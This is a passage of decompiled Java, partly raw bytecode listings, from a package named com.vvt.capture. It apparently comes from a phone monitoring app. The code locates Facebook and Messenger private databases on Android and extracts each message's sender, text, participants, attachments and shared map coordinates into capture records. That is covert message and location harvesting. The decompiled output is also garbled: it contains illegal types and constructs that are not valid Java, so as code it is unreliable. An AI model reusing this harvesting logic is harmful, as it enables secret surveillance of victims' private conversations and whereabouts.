    //   38: invokestatic 453	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   41: astore 9
    //   43: new 436	java/io/File
    //   46: astore 8
    //   48: aload 8
    //   50: aload 9
    //   52: invokespecial 441	java/io/File:<init>	(Ljava/lang/String;)V
    //   55: aload 8
    //   57: invokevirtual 444	java/io/File:exists	()Z
    //   60: istore 6
    //   62: iload 6
    //   64: ifeq +232 -> 296
    //   67: new 436	java/io/File
    //   70: astore 9
    //   72: aload 9
    //   74: aload_2
    //   75: invokespecial 441	java/io/File:<init>	(Ljava/lang/String;)V
    //   78: aload 9
    //   80: invokevirtual 444	java/io/File:exists	()Z
    //   83: istore 7
    //   85: iload 7
    //   87: ifeq +315 -> 402
    //   90: ldc_w 338
    //   93: astore 5
    //   95: ldc_w 512
    //   98: istore 10
    //   100: iload 10
    //   102: newarray <illegal type>
    //   104: astore 11
    //   106: new 515	java/io/FileReader
    //   109: astore 8
    //   111: aload 8
    //   113: aload 9
    //   115: invokespecial 518	java/io/FileReader:<init>	(Ljava/io/File;)V
    //   118: new 520	java/io/BufferedReader
    //   121: astore 9
    //   123: aload 9
    //   125: aload 8
    //   127: invokespecial 523	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   130: iconst_0
    //   131: istore 12
    //   133: aload 9
    //   135: aload 11
    //   137: iconst_0
    //   138: iload 10
    //   140: invokevirtual 527	java/io/BufferedReader:read	([CII)I
    //   143: istore 12
    //   145: new 168	java/lang/StringBuilder
    //   148: astore 13
    //   150: aload 13
    //   152: invokespecial 169	java/lang/StringBuilder:<init>	()V
    //   155: aload 13
    //   157: aload 5
    //   159: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   162: astore 5
    //   164: new 26	java/lang/String
    //   167: astore 13
    //   169: aload 13
    //   171: aload 11
    //   173: iconst_0
    //   174: iload 12
    //   176: invokespecial 530	java/lang/String:<init>	([CII)V
    //   179: aload 5
    //   181: aload 13
    //   183: invokevirtual 173	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   186: astore 5
    //   188: aload 5
    //   190: invokevirtual 181	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   193: astore 5
    //   195: iload 12
    //   197: iload 10
    //   199: if_icmpge -69 -> 130
    //   202: aload 5
    //   204: ifnull +72 -> 276
    //   207: aload 5
    //   209: invokevirtual 49	java/lang/String:length	()I
    //   212: istore 10
    //   214: iload 10
    //   216: ifle +60 -> 276
    //   219: ldc_w 532
    //   222: astore 14
    //   224: aload 5
    //   226: aload 14
    //   228: invokevirtual 281	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   231: istore 10
    //   233: ldc_w 534
    //   236: astore 11
    //   238: aload 5
    //   240: aload 11
    //   242: iload 10
    //   244: invokevirtual 537	java/lang/String:indexOf	(Ljava/lang/String;I)I
    //   247: istore 15
    //   249: iconst_m1
    //   250: istore 12
    //   252: iload 10
    //   254: iload 12
    //   256: if_icmple +20 -> 276
    //   259: iload 10
    //   261: bipush 40
    //   263: iadd
    //   264: istore 10
    //   266: aload 5
    //   268: iload 10
    //   270: iload 15
    //   272: invokevirtual 540	java/lang/String:substring	(II)Ljava/lang/String;
    //   275: astore_3
    //   276: aload 8
    //   278: ifnull +8 -> 286
    //   281: aload 8
    //   283: invokevirtual 541	java/io/FileReader:close	()V
    //   286: aload 9
    //   288: ifnull +8 -> 296
    //   291: aload 9
    //   293: invokevirtual 542	java/io/BufferedReader:close	()V
    //   296: getstatic 16	com/vvt/capture/removeFromPath/a/a:a	Z
    //   299: istore 6
    //   301: iload 6
    //   303: ifeq +3 -> 306
    //   306: aload_3
    //   307: areturn
    //   308: astore 9
    //   310: iconst_0
    //   311: istore 6
    //   313: aconst_null
    //   314: astore 9
    //   316: iconst_0
    //   317: istore 7
    //   319: aconst_null
    //   320: astore 8
    //   322: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   325: istore 4
    //   327: iload 4
    //   329: ifeq +3 -> 332
    //   332: aload 8
    //   334: ifnull +8 -> 342
    //   337: aload 8
    //   339: invokevirtual 541	java/io/FileReader:close	()V
    //   342: aload 9
    //   344: ifnull -48 -> 296
    //   347: aload 9
    //   349: invokevirtual 542	java/io/BufferedReader:close	()V
    //   352: goto -56 -> 296
    //   355: astore 9
    //   357: goto -61 -> 296
    //   360: astore 9
    //   362: iconst_0
    //   363: istore 7
    //   365: aconst_null
    //   366: astore 8
    //   368: aconst_null
    //   369: astore 16
    //   371: aload 9
    //   373: astore_3
    //   374: iconst_0
    //   375: istore 6
    //   377: aconst_null
    //   378: astore 9
    //   380: aload 8
    //   382: ifnull +8 -> 390
    //   385: aload 8
    //   387: invokevirtual 541	java/io/FileReader:close	()V
    //   390: aload 9
    //   392: ifnull +8 -> 400
    //   395: aload 9
    //   397: invokevirtual 542	java/io/BufferedReader:close	()V
    //   400: aload_3
    //   401: athrow
    //   402: getstatic 23	com/vvt/capture/removeFromPath/a/a:MyUncaughtExceptionHandler	Z
    //   405: istore 6
    //   407: iload 6
    //   409: ifeq -113 -> 296
    //   412: goto -116 -> 296
    //   415: astore 8
    //   417: goto -27 -> 390
    //   420: astore 9
    //   422: goto -22 -> 400
    //   425: astore 8
    //   427: goto -85 -> 342
    //   430: astore 8
    //   432: goto -146 -> 286
    //   435: astore 16
    //   437: iconst_0
    //   438: istore 6
    //   440: aconst_null
    //   441: astore 9
    //   443: aload 16
    //   445: astore_3
    //   446: goto -66 -> 380
    //   449: astore_3
    //   450: goto -70 -> 380
    //   453: astore 9
    //   455: iconst_0
    //   456: istore 6
    //   458: aconst_null
    //   459: astore 9
    //   461: goto -139 -> 322
    //   464: astore 5
    //   466: goto -144 -> 322
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	469	0	paramString1	String
    //   0	469	1	paramString2	String
    //   0	469	2	paramString3	String
    //   1	445	3	localObject1	Object
    //   449	1	3	localObject2	Object
    //   3	325	4	bool1	boolean
    //   6	261	5	localObject3	Object
    //   464	1	5	localException1	Exception
    //   11	446	6	bool2	boolean
    //   19	345	7	bool3	boolean
    //   26	360	8	localObject4	Object
    //   415	1	8	localIOException1	java.io.IOException
    //   425	1	8	localIOException2	java.io.IOException
    //   430	1	8	localIOException3	java.io.IOException
    //   41	251	9	localObject5	Object
    //   308	1	9	localException2	Exception
    //   314	34	9	localObject6	Object
    //   355	1	9	localIOException4	java.io.IOException
    //   360	12	9	localObject7	Object
    //   378	18	9	localObject8	Object
    //   420	1	9	localIOException5	java.io.IOException
    //   441	1	9	localObject9	Object
    //   453	1	9	localException3	Exception
    //   459	1	9	localObject10	Object
    //   98	171	10	i	int
    //   104	137	11	localObject11	Object
    //   131	126	12	j	int
    //   148	34	13	localObject12	Object
    //   222	5	14	str	String
    //   247	24	15	k	int
    //   369	1	16	localObject13	Object
    //   435	9	16	localObject14	Object
    // Exception table:
    //   from	to	target	type
    //   100	104	308	java/lang/Exception
    //   106	109	308	java/lang/Exception
    //   113	118	308	java/lang/Exception
    //   291	296	355	java/io/IOException
    //   347	352	355	java/io/IOException
    //   100	104	360	finally
    //   106	109	360	finally
    //   113	118	360	finally
    //   385	390	415	java/io/IOException
    //   395	400	420	java/io/IOException
    //   337	342	425	java/io/IOException
    //   281	286	430	java/io/IOException
    //   118	121	435	finally
    //   125	130	435	finally
    //   138	143	449	finally
    //   145	148	449	finally
    //   150	155	449	finally
    //   157	162	449	finally
    //   164	167	449	finally
    //   174	179	449	finally
    //   181	186	449	finally
    //   188	193	449	finally
    //   207	212	449	finally
    //   226	231	449	finally
    //   242	247	449	finally
    //   270	275	449	finally
    //   322	325	449	finally
    //   118	121	453	java/lang/Exception
    //   125	130	453	java/lang/Exception
    //   138	143	464	java/lang/Exception
    //   145	148	464	java/lang/Exception
    //   150	155	464	java/lang/Exception
    //   157	162	464	java/lang/Exception
    //   164	167	464	java/lang/Exception
    //   174	179	464	java/lang/Exception
    //   181	186	464	java/lang/Exception
    //   188	193	464	java/lang/Exception
    //   207	212	464	java/lang/Exception
    //   226	231	464	java/lang/Exception
    //   242	247	464	java/lang/Exception
    //   270	275	464	java/lang/Exception
  }
  
  private static String a(String paramString, boolean paramBoolean)
  {
    boolean bool1 = a;
    Object localObject2;
    Object localObject3;
    if ((!bool1) || (paramBoolean))
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = ImType.FACEBOOK;
      localObject2 = ImMediaFileType.THUMBMAIL;
      localObject1 = com.vvt.im.a.c.a(paramString, (ImType)localObject1, (ImMediaFileType)localObject2);
      localObject2 = com.vvt.im.a.c.a(ImMediaFileType.THUMBMAIL);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = File.separator;
    }
    for (Object localObject1 = (String)localObject3 + (String)localObject2;; localObject1 = (String)localObject3 + (String)localObject2)
    {
      boolean bool2 = a;
      if (bool2) {}
      return (String)localObject1;
      bool1 = a;
      if (bool1) {}
      localObject1 = ImType.FACEBOOK;
      localObject2 = ImMediaFileType.ATTACHMENT;
      localObject1 = com.vvt.im.a.c.a(paramString, (ImType)localObject1, (ImMediaFileType)localObject2);
      localObject2 = com.vvt.im.a.c.a(ImMediaFileType.ATTACHMENT);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = File.separator;
    }
  }
  
  public static List a()
  {
    int i = 2;
    int j = 1;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new Object[i];
    localObject1[0] = "/data/data";
    localObject1[j] = "com.facebook.katana";
    Object localObject2 = String.format("%s/%s/databases", (Object[])localObject1);
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject2 = (String)localObject2 + "/threads_db2";
    localArrayList.add(localObject2);
    localObject1 = new Object[i];
    localObject1[0] = "/dbdata/databases";
    localObject1[j] = "com.facebook.katana";
    localObject2 = String.format("%s/%s", (Object[])localObject1);
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject2 = (String)localObject2 + "/threads_db2";
    localArrayList.add(localObject2);
    localObject1 = new Object[i];
    localObject1[0] = "/data/data";
    localObject1[j] = "com.facebook.orca";
    localObject2 = String.format("%s/%s/databases", (Object[])localObject1);
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject2 = (String)localObject2 + "/threads_db2";
    localArrayList.add(localObject2);
    localObject1 = new Object[i];
    localObject1[0] = "/dbdata/databases";
    String str = "com.facebook.orca";
    localObject1[j] = str;
    localObject2 = String.format("%s/%s", (Object[])localObject1);
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject2 = ((StringBuilder)localObject1).append((String)localObject2);
    localObject1 = "/threads_db2";
    localObject2 = (String)localObject1;
    localArrayList.add(localObject2);
    boolean bool2 = b;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase1, Cursor paramCursor, String paramString1, String paramString2, SQLiteDatabase paramSQLiteDatabase2, SQLiteDatabase paramSQLiteDatabase3, com.vvt.base.b paramb, String paramString3, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase4)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    if (paramCursor != null) {}
    for (;;)
    {
      Object localObject3;
      Object localObject9;
      try
      {
        Object localObject1 = ICallLogData.Direction.IN;
        bool1 = false;
        float f = 0.0F;
        localObject1 = null;
        boolean bool7 = paramCursor.moveToNext();
        if (bool7)
        {
          localObject3 = new java/util/ArrayList;
          ((ArrayList)localObject3).<init>();
          localObject4 = "";
          localObject4 = ICallLogData.Direction.IN;
          com.vvt.im.events.info.d locald = a(paramString1, paramString2, paramSQLiteDatabase2);
          localObject4 = "time";
          int i3 = paramCursor.getColumnIndex((String)localObject4);
          long l1 = paramCursor.getLong(i3);
          localObject4 = "id";
          i3 = paramCursor.getColumnIndex((String)localObject4);
          String str1 = paramCursor.getString(i3);
          localObject4 = "msg_type";
          i3 = paramCursor.getColumnIndex((String)localObject4);
          int i5 = paramCursor.getInt(i3);
          localObject4 = "attachments";
          i3 = paramCursor.getColumnIndex((String)localObject4);
          Object localObject5 = paramCursor.getString(i3);
          localObject4 = "shares";
          i3 = paramCursor.getColumnIndex((String)localObject4);
          localObject6 = paramCursor.getString(i3);
          localObject4 = "sticker_id";
          i3 = paramCursor.getColumnIndex((String)localObject4);
          if (i3 < 0) {
            break label1848;
          }
          localObject1 = paramCursor.getString(i3);
          localObject7 = localObject1;
          localObject1 = "thread_key";
          int i = paramCursor.getColumnIndex((String)localObject1);
          Object localObject8;
          int i6;
          String str2;
          if (i >= 0)
          {
            localObject1 = paramCursor.getString(i);
            localObject8 = localObject1;
            localObject1 = "ispersonalchat";
            i = paramCursor.getColumnIndex((String)localObject1);
            if (i < 0) {
              continue;
            }
            i = paramCursor.getInt(i);
            if (i == 0)
            {
              i = 1;
              f = Float.MIN_VALUE;
              i6 = i;
              if (!paramBoolean) {
                continue;
              }
              localObject1 = "participants";
              i = paramCursor.getColumnIndex((String)localObject1);
              localObject9 = paramCursor.getString(i);
              boolean bool2 = a;
              if (bool2) {}
              localObject10 = paramb.f();
              localObject1 = paramSQLiteDatabase1;
              localObject4 = paramString1;
              localObject11 = paramSQLiteDatabase4;
              localObject1 = a(paramSQLiteDatabase1, paramString1, (String)localObject9, locald, (String)localObject10, paramSQLiteDatabase4);
              localObject12 = localObject1;
              if (locald != null)
              {
                localObject1 = locald.g();
                bool2 = com.vvt.ag.b.a((String)localObject1);
                if (bool2)
                {
                  localObject4 = ((List)localObject12).iterator();
                  bool2 = ((Iterator)localObject4).hasNext();
                  if (bool2)
                  {
                    localObject1 = ((Iterator)localObject4).next();
                    localObject1 = (com.vvt.im.events.info.e)localObject1;
                    localObject9 = ((com.vvt.im.events.info.e)localObject1).d();
                    localObject9 = ((String)localObject9).trim();
                    localObject10 = locald.b();
                    localObject10 = ((String)localObject10).trim();
                    boolean bool8 = ((String)localObject9).equals(localObject10);
                    if (!bool8) {
                      continue;
                    }
                    localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
                    locald.a((String)localObject4);
                    localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
                    locald.f((String)localObject4);
                    localObject4 = ((com.vvt.im.events.info.e)localObject1).b();
                    locald.d((String)localObject4);
                    localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
                    locald.c((String)localObject1);
                  }
                }
              }
              localObject1 = "sender";
              int j = paramCursor.getColumnIndex((String)localObject1);
              localObject10 = paramCursor.getString(j);
              localObject1 = "source";
              j = paramCursor.getColumnIndex((String)localObject1);
              str2 = paramCursor.getString(j);
              localObject1 = "text";
              j = paramCursor.getColumnIndex((String)localObject1);
              localObject9 = paramCursor.getString(j);
              localObject1 = "coordinates";
              j = paramCursor.getColumnIndex((String)localObject1);
              localObject11 = paramCursor.getString(j);
              localObject1 = "conversation_name";
              j = paramCursor.getColumnIndex((String)localObject1);
              localObject4 = paramCursor.getString(j);
              boolean bool3 = com.vvt.ag.b.a((String)localObject4);
              if ((!bool3) || (i6 != 0)) {
                continue;
              }
              localObject13 = ((List)localObject12).iterator();
              bool3 = ((Iterator)localObject13).hasNext();
              if (!bool3) {
                continue;
              }
              localObject1 = ((Iterator)localObject13).next();
              localObject1 = (com.vvt.im.events.info.e)localObject1;
              localObject14 = ((com.vvt.im.events.info.e)localObject1).d();
              localObject14 = ((String)localObject14).trim();
              localObject15 = locald.b();
              localObject15 = ((String)localObject15).trim();
              boolean bool9 = ((String)localObject14).equals(localObject15);
              if (bool9) {
                break label1841;
              }
              localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
              localObject1 = f(paramSQLiteDatabase1, (String)localObject1);
              localObject4 = localObject1;
              continue;
            }
          }
          else
          {
            localObject1 = "thread_id";
            k = paramCursor.getColumnIndex((String)localObject1);
            localObject1 = paramCursor.getString(k);
            localObject8 = localObject1;
            continue;
          }
          int k = 0;
          f = 0.0F;
          localObject1 = null;
          continue;
          localObject1 = "GROUP:";
          k = ((String)localObject8).indexOf((String)localObject1);
          i3 = -1;
          if (k != i3)
          {
            k = 1;
            f = Float.MIN_VALUE;
            i6 = k;
            continue;
          }
          k = 0;
          f = 0.0F;
          localObject1 = null;
          continue;
          localObject10 = paramb.f();
          localObject1 = paramSQLiteDatabase1;
          localObject4 = paramString1;
          localObject9 = localObject8;
          localObject11 = paramSQLiteDatabase4;
          localObject1 = b(paramSQLiteDatabase1, paramString1, (String)localObject8, locald, (String)localObject10, paramSQLiteDatabase4);
          Object localObject12 = localObject1;
          continue;
          boolean bool4 = b;
          if (bool4) {}
          localObject1 = "pending_send_media_attachment";
          int m = paramCursor.getColumnIndex((String)localObject1);
          localObject13 = paramCursor.getString(m);
          localObject1 = new java/text/SimpleDateFormat;
          Object localObject14 = "dd/MM/yy HH:mm:ss";
          ((SimpleDateFormat)localObject1).<init>((String)localObject14);
          localObject14 = new java/util/Date;
          ((Date)localObject14).<init>(l1);
          String str3 = ((SimpleDateFormat)localObject1).format((Date)localObject14);
          f localf = a(paramSQLiteDatabase1, paramString1, (String)localObject10, (String)localObject11);
          com.vvt.im.events.info.b localb = a(paramString1, i6, (String)localObject8, (String)localObject4, (List)localObject12);
          localObject1 = localf.a();
          long l2 = Long.parseLong((String)localObject1);
          localObject10 = locald.b();
          long l3 = Long.parseLong((String)localObject10);
          int n = l2 < l3;
          double d1;
          double d2;
          if (n == 0)
          {
            localObject8 = ICallLogData.Direction.OUT;
            if (localObject6 != null)
            {
              localObject1 = "maps.google.com";
              n = ((String)localObject6).contains((CharSequence)localObject1);
              if (n != 0)
              {
                n = a;
                if (n != 0) {}
                localObject4 = c((String)localObject6);
                if (localObject4 == null) {
                  break label1812;
                }
                d1 = ((com.vvt.im.events.info.c)localObject4).a();
                d2 = 0.0D;
                n = d1 < d2;
                if (n == 0) {
                  break label1812;
                }
                d1 = ((com.vvt.im.events.info.c)localObject4).b();
                d2 = 0.0D;
                n = d1 < d2;
                if (n == 0) {
                  break label1812;
                }
                n = 1;
                f = Float.MIN_VALUE;
                boolean bool10 = false;
                localObject10 = null;
                bool11 = false;
                localObject11 = null;
                localObject6 = localObject3;
                localObject13 = localObject4;
                i3 = n;
                if (!bool10) {
                  break label1777;
                }
                localObject1 = "";
                int i7 = d(paramSQLiteDatabase1, str1);
                i8 = a(i5, (String)localObject1, bool11, bool10, i3);
                localObject3 = new com/vvt/capture/b/d;
                ((com.vvt.capture.b.d)localObject3).<init>();
                ((com.vvt.capture.b.d)localObject3).a(i8);
                ((com.vvt.capture.b.d)localObject3).a((String)localObject1);
                ((com.vvt.capture.b.d)localObject3).d(str3);
                ((com.vvt.capture.b.d)localObject3).a(i6);
                ((com.vvt.capture.b.d)localObject3).c(str1);
                ((com.vvt.capture.b.d)localObject3).a(locald);
                ((com.vvt.capture.b.d)localObject3).e(paramString2);
                ((com.vvt.capture.b.d)localObject3).a((List)localObject12);
                ((com.vvt.capture.b.d)localObject3).b(str2);
                ((com.vvt.capture.b.d)localObject3).a(localf);
                ((com.vvt.capture.b.d)localObject3).a(localb);
                ((com.vvt.capture.b.d)localObject3).b(l1);
                ((com.vvt.capture.b.d)localObject3).a((ICallLogData.Direction)localObject8);
                ((com.vvt.capture.b.d)localObject3).b(bool11);
                ((com.vvt.capture.b.d)localObject3).b((List)localObject6);
                if (i3 != 0) {
                  ((com.vvt.capture.b.d)localObject3).a((com.vvt.im.events.info.c)localObject13);
                }
                if (i7 != 0) {
                  continue;
                }
                n = 1;
                f = Float.MIN_VALUE;
                ((com.vvt.capture.b.d)localObject3).c(n);
                localArrayList.add(localObject3);
                localObject1 = localObject7;
              }
            }
          }
          else
          {
            localObject8 = ICallLogData.Direction.IN;
            continue;
          }
          if (localObject6 != null)
          {
            localObject1 = "bing.com";
            n = ((String)localObject6).contains((CharSequence)localObject1);
            if (n != 0)
            {
              n = b;
              if (n != 0) {}
              localObject4 = d((String)localObject6);
              if (localObject4 == null) {
                break label1812;
              }
              d1 = ((com.vvt.im.events.info.c)localObject4).a();
              d2 = 0.0D;
              n = d1 < d2;
              if (n == 0) {
                break label1812;
              }
              d1 = ((com.vvt.im.events.info.c)localObject4).b();
              d2 = 0.0D;
              n = d1 < d2;
              if (n == 0) {
                break label1812;
              }
              n = 1;
              f = Float.MIN_VALUE;
              i8 = 0;
              localObject10 = null;
              bool11 = false;
              localObject11 = null;
              localObject6 = localObject3;
              localObject13 = localObject4;
              i3 = n;
              continue;
            }
          }
          localObject14 = locald.f();
          localObject10 = paramSQLiteDatabase1;
          localObject11 = localObject5;
          localObject3 = paramString2;
          localObject5 = paramString1;
          Object localObject15 = paramb;
          localObject4 = a(paramSQLiteDatabase1, (String)localObject11, (String)localObject6, (ICallLogData.Direction)localObject8, (String)localObject13, paramString2, str1, paramString1, (String)localObject14, paramb, paramString3);
          int i1 = ((List)localObject4).size();
          if (i1 == 0)
          {
            boolean bool5 = com.vvt.ag.b.a((String)localObject7);
            if (!bool5)
            {
              localObject10 = a(paramSQLiteDatabase3, (String)localObject7, paramString1);
              if (localObject10 == null) {
                break label1784;
              }
              i2 = ((List)localObject10).size();
              if (i2 <= 0) {
                break label1784;
              }
              i2 = 1;
              f = Float.MIN_VALUE;
              bool11 = true;
              localObject6 = localObject10;
              localObject13 = null;
              i8 = i2;
              i4 = 0;
              localObject4 = null;
              continue;
            }
            localObject5 = paramSQLiteDatabase1;
            localObject14 = localObject6;
            localObject15 = paramString1;
            localObject10 = a(paramSQLiteDatabase1, (String)localObject6, paramString1, (ICallLogData.Direction)localObject8, str1, paramSQLiteDatabase3);
            continue;
          }
          int i2 = 1;
          f = Float.MIN_VALUE;
          i8 = 0;
          localObject10 = null;
          bool11 = i2;
          localObject6 = localObject4;
          localObject13 = null;
          i4 = 0;
          localObject4 = null;
          continue;
          i2 = 0;
          f = 0.0F;
          localObject1 = null;
          continue;
        }
        bool6 = b;
      }
      catch (Exception localException)
      {
        bool6 = c;
        if (!bool6) {}
      }
      if (bool6) {}
      boolean bool6 = a;
      if (bool6) {}
      return localArrayList;
      label1777:
      Object localObject2 = localObject9;
      continue;
      label1784:
      int i4 = 0;
      Object localObject4 = null;
      boolean bool11 = false;
      Object localObject11 = null;
      Object localObject6 = localObject10;
      Object localObject13 = null;
      int i8 = 0;
      Object localObject10 = null;
      continue;
      label1812:
      i8 = 0;
      localObject10 = null;
      bool11 = false;
      localObject11 = null;
      localObject6 = localObject3;
      localObject13 = localObject4;
      i4 = 0;
      localObject4 = null;
      continue;
      label1841:
      localObject2 = localObject4;
      continue;
      label1848:
      Object localObject7 = localObject2;
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = b(paramSQLiteDatabase, paramString1);
    boolean bool2 = com.vvt.ag.b.a((String)localObject1);
    Object localObject2;
    if (!bool2)
    {
      localObject2 = "null";
      bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject2);
      if (!bool2) {}
    }
    else
    {
      localObject2 = "227878347358915";
      bool2 = paramString1.equals(localObject2);
      if (bool2)
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = "https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/851577_246547505491999_862435009_n.png";
      }
    }
    bool2 = a;
    if ((!bool2) || (localObject1 != null))
    {
      localObject2 = "null";
      bool2 = ((String)localObject1).equalsIgnoreCase((String)localObject2);
      if (!bool2)
      {
        localObject2 = ImType.FACEBOOK;
        Object localObject3 = ImMediaFileType.THUMBMAIL;
        localObject2 = com.vvt.im.a.c.a(paramString2, (ImType)localObject2, (ImMediaFileType)localObject3);
        localObject3 = com.vvt.im.a.c.a(ImMediaFileType.THUMBMAIL);
        Object localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
        localObject4 = File.separator;
        localObject2 = (String)localObject4 + (String)localObject3;
        localObject3 = "https://";
        boolean bool3 = ((String)localObject1).startsWith((String)localObject3);
        if (bool3)
        {
          localObject3 = "https://";
          localObject4 = "http://";
          localObject1 = ((String)localObject1).replace((CharSequence)localObject3, (CharSequence)localObject4);
          bool3 = a;
          if (!bool3) {}
        }
        localObject3 = ".webp";
        int i = ((String)localObject1).lastIndexOf((String)localObject3);
        int j = -1;
        if (i != j)
        {
          j = 0;
          localObject4 = null;
          localObject1 = ((String)localObject1).substring(0, i);
        }
        bool1 = c((String)localObject1, (String)localObject2);
        if (bool1)
        {
          localObject1 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject1).<init>();
          ((com.vvt.im.events.info.a)localObject1).a(null);
          localObject3 = "image/png";
          ((com.vvt.im.events.info.a)localObject1).b((String)localObject3);
          ((com.vvt.im.events.info.a)localObject1).d((String)localObject2);
          ((com.vvt.im.events.info.a)localObject1).a(null);
          ((com.vvt.im.events.info.a)localObject1).c(null);
          ((com.vvt.im.events.info.a)localObject1).b(null);
          localArrayList.add(localObject1);
        }
        bool1 = b;
        if (!bool1) {}
      }
    }
    return localArrayList;
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, String paramString2, SQLiteDatabase paramSQLiteDatabase2, SQLiteDatabase paramSQLiteDatabase3, com.vvt.base.b paramb, String paramString3, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase4)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Cursor localCursor = null;
    for (;;)
    {
      Object localObject4;
      try
      {
        localObject1 = a(paramString2);
        if (localObject1 == null) {
          break label478;
        }
        localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject1);
        if (localObject4 == null) {
          break label478;
        }
        boolean bool2 = false;
        localObject4 = null;
        localObject1 = ImType.FACEBOOK;
        localObject1 = com.vvt.im.events.store.a.a(paramString1, (ImType)localObject1);
        if (localObject1 == null) {
          break label486;
        }
        boolean bool4 = localObject1 instanceof StringEventKeys;
        if (!bool4) {
          break label486;
        }
        localObject1 = (StringEventKeys)localObject1;
        if (localObject1 == null) {
          break label478;
        }
        bool2 = a;
        if (bool2) {}
        localObject1 = ((StringEventKeys)localObject1).getEventKeys();
        localIterator = ((List)localObject1).iterator();
      }
      catch (Exception localException)
      {
        Object localObject1;
        Iterator localIterator;
        int i;
        int j;
        Object localObject5;
        int k;
        Object localObject6;
        bool1 = c;
        if ((bool1) && (localCursor == null)) {
          continue;
        }
        localCursor.close();
        bool1 = a;
        if (!bool1) {
          continue;
        }
        bool1 = a;
        if (!bool1) {
          continue;
        }
        return localArrayList;
        localObject4 = "timestamp_ms";
        long l1 = c(paramSQLiteDatabase1, localException, (String)localObject4);
        long l2 = -1;
        boolean bool5 = l1 < l2;
        if (!bool5) {
          break label436;
        }
        l1 = System.currentTimeMillis() - l1;
        l2 = 259200L;
        boolean bool3 = l1 < l2;
        if (!bool3) {
          continue;
        }
        localObject4 = new com/vvt/capture/b/d;
        ((com.vvt.capture.b.d)localObject4).<init>();
        ((com.vvt.capture.b.d)localObject4).c(localException);
        bool1 = false;
        Object localObject2 = null;
        ((com.vvt.capture.b.d)localObject4).c(false);
        localArrayList.add(localObject4);
        continue;
      }
      finally
      {
        if (localCursor == null) {
          continue;
        }
        localCursor.close();
      }
      bool1 = localIterator.hasNext();
      label436:
      Object localObject3;
      if (bool1)
      {
        localObject1 = localIterator.next();
        localObject1 = (String)localObject1;
        i = d(paramSQLiteDatabase1, (String)localObject1);
        if (i == 0)
        {
          localObject4 = b(paramSQLiteDatabase1, paramBoolean);
          j = 2;
          localObject5 = new String[j];
          k = 0;
          localObject6 = null;
          localObject5[0] = localObject1;
          bool1 = true;
          k = 1;
          localObject6 = Integer.toString(k);
          localObject5[bool1] = localObject6;
          localCursor = paramSQLiteDatabase1.rawQuery((String)localObject4, (String[])localObject5);
          localObject1 = paramSQLiteDatabase1;
          localObject4 = paramString1;
          localObject5 = paramString2;
          localObject6 = paramSQLiteDatabase2;
          localObject1 = a(paramSQLiteDatabase1, localCursor, paramString1, paramString2, paramSQLiteDatabase2, paramSQLiteDatabase3, paramb, paramString3, paramBoolean, paramSQLiteDatabase4);
          localArrayList.addAll((Collection)localObject1);
        }
        else
        {
          localObject4 = new com/vvt/capture/b/d;
          ((com.vvt.capture.b.d)localObject4).<init>();
          ((com.vvt.capture.b.d)localObject4).c(str);
          bool1 = false;
          localObject3 = null;
          ((com.vvt.capture.b.d)localObject4).c(false);
          localArrayList.add(localObject4);
        }
      }
      else
      {
        label478:
        if (localCursor != null)
        {
          continue;
          label486:
          bool1 = false;
          localObject3 = null;
        }
      }
    }
  }
  
  private static List a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, String paramString2, ICallLogData.Direction paramDirection, String paramString3, SQLiteDatabase paramSQLiteDatabase2)
  {
    int i = 1;
    int k = 2;
    boolean bool1 = false;
    String str = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    int i1;
    if (paramString1 != null)
    {
      int m = paramString1.length();
      i1 = 3;
      if (m >= i1) {}
    }
    else
